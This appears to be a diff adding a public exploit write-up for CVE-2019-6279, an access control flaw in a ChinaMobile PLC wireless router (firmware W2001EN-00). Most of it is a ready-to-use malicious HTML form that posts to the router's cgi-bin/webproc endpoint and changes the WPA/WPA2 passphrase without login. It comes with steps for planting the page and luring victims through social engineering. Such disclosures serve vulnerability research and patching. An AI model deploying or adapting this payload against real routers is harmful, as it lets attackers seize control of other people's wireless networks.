@@ -1,0 +1,70 @@
+# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Incorrect Access
+Control
+# Date: 14/01/2019
+# Exploit Author: Kumar Saurav
+# Reference: https://0dayfindings.home.blog/2019/01/15/plc-wireless-router-gpn2-4p21-c-cn-incorrect-access-control/
+# Vendor: ChinaMobile
+# Category: Hardware
+# Version: GPN2.4P21-C-CN (Firmware: W2001EN-00)
+# Tested on: Windows
+# CVE : CVE-2019-6279
+
+#Description: ChinaMobile PLC Wireless Router GPN2.4P21-C-CN devices with
+firmware
+W2001EN-00 have an Incorrect Access Control vulnerability via the
+cgi-bin/webproc?getpage=html/index.html
+subpage=wlsecurity URI, allowing an Attacker to change the Wireless
+Security Password.
+
+Reproduction Steps:
+Step 1: Building a malicious html web page
+Step 2: Attacker’s wants to change the wireless security (WPA/WPA2) key to
+“PSWDmatlo331#@!” (in my case)
+
+Step 3: (192.168.59.254 in my Case)
+<html>
+<body>
+<form method=”POST” action=”http://192.168.59.254:80/cgi-bin/webproc “>
+<input type=”text” name=”sessionid” value=”2a39a09e”>
+<input type=”text” name=”language” value=”en_us”>
+<input type=”text” name=”sys_UserName” value=”admin”>
+<input type=”text” name=”var:menu” value=”setup”>
+<input type=”text” name=”var:page” value=”wireless”>
+<input type=”text” name=”var:subpage” value=”wlsecurity”>
+<input type=”text” name=”var:errorpage” value=”wlsecurity”>
+<input type=”text” name=”getpage” value=”html/index.html”>
+<input type=”text” name=”errorpage” value=”html/index.html”>
+<input type=”text” name=”var:arrayid” value=”0?>
+<input type=”text” name=”obj-action” value=”set”>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.BeaconType ”
+value=”11i”>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iEncryptionModes”
+value=”AESEncryption”>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iAuthenticationMode”
+value=”PSKAuthentication”>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_WPAGroupRekey”
+value=”100?>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase”
+value=”PSWDmatlo331#@!”>
+<input type=”text”
+name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_PSKExpression”
+value=”KeyPassphrase”>
+<input type=”submit” value=”Send”>
+</form>
+</body>
+</html>
+
+Step 4: save this as Incorrect_Access_Control.html
+Step 5: Planting this malicious web page (Incorrect_Access_Control.html)
+that are likely to be visited by the victim’s (by social engineering) or
+any user connected in the Access Point (AP) will have to visit this page or
+any attacker’s connected in the AP will trigger this exploit.
+Step 6: After execution of above exploit, wireless security (WPA/WPA2) key
+will change!!
+
+Note: This vulnerability allowing an attacker to reproduce without login.
